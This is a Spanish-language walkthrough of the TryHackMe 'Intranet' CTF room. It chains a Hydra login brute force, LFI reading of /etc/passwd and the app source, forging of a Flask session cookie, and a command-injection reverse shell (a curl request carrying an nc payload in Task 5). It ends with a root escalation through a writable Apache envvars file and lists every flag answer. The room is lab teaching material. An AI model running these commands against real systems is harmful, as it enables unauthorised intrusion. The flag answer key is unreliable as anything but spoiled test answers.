# Intranet

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Boot2Root / Linux | intranet | https://tryhackme.com/room/intranet | 02 Level Medium | TryHackMe | Flask, Apache2, Hydra, John, flask-unsign, LFI | Escalada a root |

---

**Contexto:** **Intranet** es una máquina Linux *boot2root* (SecureSolaCoders) con una aplicación **Flask** escuchando en el puerto `8080`. El reconocimiento web y una fuga de información permiten construir un diccionario de usuarios y contraseñas con el que un **brute force** (Hydra) contra el formulario de login obtiene credenciales válidas. A partir de ahí se encadena un **Path Traversal / LFI** para leer `/etc/passwd` y el código fuente de la aplicación; el código revela que la *secret key* de Flask se genera como `"secret_key_" + str(random.randrange(100000,999999))`, lo que permite **crackear** la cookie de sesión con `flask-unsign` y **forjar** un token de `admin`. El panel `/admin` delata un **Command Injection** (`os.system(request.form["debug"])`) que entrega una shell reversa como `www-data`; el movimiento lateral a `anders` (Apache2 corre como ese usuario) conduce a `user.txt` y `user2.txt`, y un permiso `sudo` sobre el reinicio de `apache2` junto con `/etc/apache2/envvars` escribible permite obtener `root.txt`.

## Solucionario

### Task 1: First web application flag
**Explicación:**

1. **Reconocimiento:** `nmap` descubre servicios web en el puerto `80` y una aplicación **Flask** en el `8080`. Se añade el dominio de la sala (p. ej. `securesolacoders.no`) a `/etc/hosts` apuntando a la IP objetivo.
2. **Enumeración de usuarios:** al inspeccionar la aplicación (página de login, errores y recursos) se filtran nombres de usuario válidos (`admin`, `devops`, `anders`, …) y palabras base de contraseñas.
3. **Construcción de wordlists:** con los nombres se crea `users.txt` y con las pistas `base.txt`; se genera un diccionario de contraseñas aplicando reglas de `john`:
   ```
   john --wordlist=base.txt --rules=TryHackMe-Intranet --stdout > wordlist.txt
   ```
4. **Brute force del login:** `hydra` contra el formulario `POST /login` descubierto en el puerto `8080`:
   ```
   hydra -L users.txt -P wordlist.txt <host> -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Error"
   ```
5. **Acceso:** con las credenciales válidas se entra a la aplicación y el primer flag aparece en el panel del usuario autenticado.

Respuesta: `THM{3d60bb5209e4574fc3dc4df418999836}`

### Task 2: Second web application flag
**Explicación:**

1. Autenticado, el formulario/endpoint de actualización de perfil carga una plantilla a partir de un parámetro controlable por el usuario.
2. El parámetro no se sanea, por lo que es vulnerable a **Path Traversal / LFI**: se envía una secuencia `../../../../etc/passwd` y el servidor devuelve el contenido del archivo.
3. La lectura arbitraria de archivos confirma la vulnerabilidad y expone el segundo flag asociado a este punto del recorrido.

Respuesta: `THM{98aa3c0ce224d523e84f2675d63d0971}`

### Task 3: Third web application flag
**Explicación:**

1. La pista indica que el *CMD* conduce al **código fuente** de la aplicación. Con el LFI se lee el estado del proceso actual en `/proc/self/stat` para extraer el **PID** (p. ej. `669`).
2. Con `/proc/<PID>/cmdline` se obtienen los argumentos del proceso y la ruta real de la aplicación Flask (`/home/devops/app.py`).
3. Se recupera el código fuente mediante el traversal y en él aparece comentado el tercer flag.

Respuesta: `THM{4ccacfd73710ac18b4ac15646b32380a}`

### Task 4: Fourth web application flag
**Explicación:**

1. En las primeras líneas de `app.py` se observa cómo se genera la *secret key* de Flask:
   ```python
   key = "secret_key_" + str(random.randrange(100000,999999))
   app.secret_key = str(key).encode()
   ```
2. Se crea `flask_base.txt` con la cadena `secret_key_` y, con una regla de `john` que añade números de 6 dígitos, se genera el diccionario de claves candidatas:
   ```
   john --rules=TryHackMe-Flask --wordlist=flask_base.txt --stdout > flask_wordlist.txt
   ```
3. Con una cookie de sesión capturada, se crackea la clave con `flask-unsign`:
   ```
   flask-unsign --unsign --wordlist flask_wordlist.txt --cookie '<cookie>'
   ```
4. Se **forja** una sesión de administrador y se accede a `/admin`:
   ```
   flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_<numero>'
   ```
5. El panel de administración muestra el cuarto flag.

Respuesta: `THM{4f3f2ebe2cec24589d4140e484b0ecd1}`

### Task 5: user.txt
**Explicación:**

1. En el código de `/admin` se ve un **Command Injection**: `os.system(request.form["debug"])` ejecuta la entrada del formulario.
2. Enviando una petición `POST /admin` con la cookie `admin` y un payload en `debug` se planta una shell reversa (URL-encodeando `&`):
   ```
   curl 'http://<host>:8080/admin' -X POST -H 'Cookie: session=<admin_cookie>' \
     --data-raw 'debug=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f'
   ```
3. Con la shell como `www-data` se enumera el sistema; se descubre que **Apache2** corre como el usuario `anders`, lo que sirve de puente de escalada.
4. Se sube una *webshell* PHP al *webroot* y, al visitarla, se obtiene ejecución como `anders`; se lee `user.txt`.

Respuesta: `THM{79445fbd3ed0b87ae248fc01a44a06fd}`

### Task 6: user2.txt
**Explicación:**

1. Ya como `anders`, se enumeran los directorios personales y archivos accesibles por el usuario.
2. Se localiza y lee `user2.txt`.

Respuesta: `THM{5c8f3b3bcbeeecded0f2541daf15a57c}`

### Task 7: root.txt
**Explicación:**

1. **Enumeración de privilegios:** `sudo -l` muestra que `anders` puede reiniciar el servicio `apache2` como root.
2. El archivo `/etc/apache2/envvars` es escribible por `anders`; además se añade una clave pública SSH a `authorized_keys` para operar con una shell estable vía SSH.
3. Se inyecta una shell reversa en `/etc/apache2/envvars` y se levanta un listener.
4. Al reiniciar el servicio con `sudo`, `envvars` se carga y se obtiene una shell como **root**; se lee `root.txt` en `/root/`.

Respuesta: `THM{6cc71ed813c926df497f8c6001131b77}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the first web application flag? | `THM{3d60bb5209e4574fc3dc4df418999836}` |
| 2 | What is the second web application flag? | `THM{98aa3c0ce224d523e84f2675d63d0971}` |
| 3 | What is the third web application flag? | `THM{4ccacfd73710ac18b4ac15646b32380a}` |
| 4 | What is the fourth web application flag? | `THM{4f3f2ebe2cec24589d4140e484b0ecd1}` |
| 5 | What is the user.txt flag? | `THM{79445fbd3ed0b87ae248fc01a44a06fd}` |
| 6 | What is the user2.txt flag? | `THM{5c8f3b3bcbeeecded0f2541daf15a57c}` |
| 7 | What is the root.txt flag? | `THM{6cc71ed813c926df497f8c6001131b77}` |

---

**Metodología:** Enumeración de servicios web (Flask en `8080` y Apache en `80`), recolección de usuarios y generación de diccionarios con reglas de `john`, brute force de credenciales con `hydra`, explotación de **Path Traversal / LFI** para leer `/etc/passwd` y el código fuente vía `/proc`, crackeo y forja de la **cookie de sesión Flask** con `flask-unsign`, **Command Injection** para una shell reversa, movimiento lateral a `anders` mediante una webshell en Apache, y escalada a root abusando de `sudo` sobre el reinicio de Apache con `/etc/apache2/envvars` escribible.

**Learning chain:** Nmap → Flask `:8080` → enumeración de usuarios → wordlists (John) → Hydra → login (flag 1) → LFI/Path Traversal → `/etc/passwd` (flag 2) → `/proc/self/stat` y `/proc/<pid>/cmdline` → `app.py` (flag 3) → `secret_key_<n>` → flask-unsign (crack + sign) → `/admin` (flag 4) → Command Injection → shell www-data → webshell Apache → anders → user.txt → user2.txt → `sudo apache2` + envvars → root.txt.

**Lección:** *La combinación de LFI y una clave de sesión débil pero predecible es letal: leer el código fuente permite descubrir cómo se firma la sesión y, sin validación de servidor, forjar un rol de administrador. Las claves de sesión deben ser aleatorias y de alta entropía, los archivos sensibles no deben filtrarse por LFI y las entradas de usuario nunca deben pasar a `os.system()`.*

**MITRE ATT&CK:** T1595 Active Scanning · T1110.001 Brute Force: Password Guessing · T1190 Exploit Public-Facing Application · T1083 File and Directory Discovery · T1552.001 Unsecured Credentials: Credentials In Files · T1505.003 Web Shell · T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching.

**Fuente:** [TryHackMe - Intranet](https://tryhackme.com/room/intranet)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
